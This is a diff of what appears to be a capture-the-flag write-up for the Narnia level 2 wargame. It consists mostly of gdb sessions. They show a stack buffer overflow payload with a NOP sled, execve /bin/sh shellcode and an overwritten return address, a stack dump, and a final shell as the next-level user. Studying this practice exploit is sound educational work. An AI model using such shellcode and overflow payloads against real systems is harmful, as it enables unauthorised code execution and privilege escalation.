@@ -69,19 +69,16 @@ Dump of assembler code for function main:
    0x080484c1 <+100>:	leave  
    0x080484c2 <+101>:	ret    
 End of assembler dump.  
-(gdb) r $(python -c'print "A"*104 + "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "ABCD"')
-The program being debugged has been started already.
-Start it from the beginning? (y or n) y
-
-Starting program: /games/narnia/narnia2 $(python -c'print "A"*104 + "\xeb\x16\x5e\x31\xd2\x52\x56\x89\xe1\x89\xf3\x31\xc0\xb0\x0b\xcd\x80\x31\xdb\x31\xc0\x40\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + "ABCD"')
+(gdb) r $(python -c 'print "A"*140 + "ABCD"')
+Starting program: /games/narnia/narnia2 $(python -c 'print "A"*140 + "ABCD"')
 
 Program received signal SIGSEGV, Segmentation fault.
-0x44434241 in ?? ()  
+0x44434241 in ?? ()
 (gdb) x/300x $esp
 0xffffd650:	0x00000000	0xffffd6e4	0xffffd6f0	0xf7feacca
 0xffffd660:	0x00000002	0xffffd6e4	0xffffd684	0x08049768
 0xffffd670:	0x0804821c	0xf7fc9000	0x00000000	0x00000000
-0xffffd680:	0x00000000	0x003c4ca9	0x38e5c8b9	0x00000000
+0xffffd680:	0x00000000	0x241cfa69	0x1cc57e79	0x00000000
 0xffffd690:	0x00000000	0x00000000	0x00000002	0x08048360
 0xffffd6a0:	0x00000000	0xf7ff04c0	0xf7e3b9e9	0xf7ffd000
 0xffffd6b0:	0x00000002	0x08048360	0x00000000	0x08048381
@@ -105,8 +102,8 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffd7d0:	0x00000019	0xffffd7fb	0x0000001f	0xffffdfe2
 0xffffd7e0:	0x0000000f	0xffffd80b	0x00000000	0x00000000
 ---Type <return> to continue, or q <return> to quit---
-0xffffd7f0:	0x00000000	0x00000000	0x96000000	0x763ce364
-0xffffd800:	0xcbab7fc8	0x4d07a88e	0x694e6072	0x00363836
+0xffffd7f0:	0x00000000	0x00000000	0x3c000000	0x2d75810c
+0xffffd800:	0x1dcb6dd8	0x4babdac5	0x6902d360	0x00363836
 0xffffd810:	0x6d61672f	0x6e2f7365	0x696e7261	0x616e2f61
 0xffffd820:	0x61696e72	0x41410032	0x41414141	0x41414141
 0xffffd830:	0x41414141	0x41414141	0x41414141	0x41414141
@@ -114,17 +111,17 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffd850:	0x41414141	0x41414141	0x41414141	0x41414141
 0xffffd860:	0x41414141	0x41414141	0x41414141	0x41414141
 0xffffd870:	0x41414141	0x41414141	0x41414141	0x41414141
-0xffffd880:	0x41414141	0x41414141	0x41414141	0x16eb4141
-0xffffd890:	0x52d2315e	0x89e18956	0xb0c031f3	0x3180cd0b
-0xffffd8a0:	0x40c031db	0xe5e880cd	0x2fffffff	0x2f6e6962
-0xffffd8b0:	0x42416873	0x58004443	0x535f4744	0x49535345
-0xffffd8c0:	0x495f4e4f	0x31313d44	0x39303632	0x45485300
+0xffffd880:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd890:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8a0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xffffd8b0:	0x42414141	0x58004443	0x535f4744	0x49535345
+0xffffd8c0:	0x495f4e4f	0x31313d44	0x39353033	0x45485300
 0xffffd8d0:	0x2f3d4c4c	0x2f6e6962	0x68736162	0x52455400
 0xffffd8e0:	0x74783d4d	0x2d6d7265	0x63363532	0x726f6c6f
 0xffffd8f0:	0x48535300	0x494c435f	0x3d544e45	0x312e3836
-0xffffd900:	0x322e3233	0x312e3234	0x35203933	0x38373039
+0xffffd900:	0x322e3233	0x312e3234	0x36203933	0x38313030
 0xffffd910:	0x00323220	0x5f485353	0x3d595454	0x7665642f
-0xffffd920:	0x7374702f	0x0032342f	0x415f434c	0x433d4c4c
+0xffffd920:	0x7374702f	0x0031322f	0x415f434c	0x433d4c4c
 0xffffd930:	0x45535500	0x616e3d52	0x61696e72	0x534c0032
 0xffffd940:	0x4c4f435f	0x3d53524f	0x303d7372	0x3d69643a
 0xffffd950:	0x333b3130	0x6e6c3a34	0x3b31303d	0x6d3a3633
@@ -155,15 +152,15 @@ Program received signal SIGSEGV, Segmentation fault.
 0xffffdad0:	0x3b31303d	0x2a3a3133	0x6d70722e	0x3b31303d
 0xffffdae0:	0x2a3a3133	0x72616a2e	0x3b31303d	0x2a3a3133
 0xffffdaf0:	0x7261772e	0x3b31303d	0x2a3a3133	0x7261652e  
-(gdb) r $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')
-(gdb) r $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')
+(gdb) r $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')  
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
 Starting program: /games/narnia/narnia2 $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')
-process 22298 is executing new program: /bin/dash
-$ ^C
-Program received signal SIGINT, Interrupt.
-0x00007ffff7b006b0 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:81
-81	../sysdeps/unix/syscall-template.S: No such file or directory.  
-(gdb) Quit  
+process 12059 is executing new program: /bin/dash  
+$ exit
+[Inferior 1 (process 12059) exited with code 0177]
+(gdb) quit  
 narnia2@melinda:/narnia$ ./narnia2 $(python -c'print "\x90"*116 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80" + "\x50\xd8\xff\xff"')  
 $ whoami
 narnia3
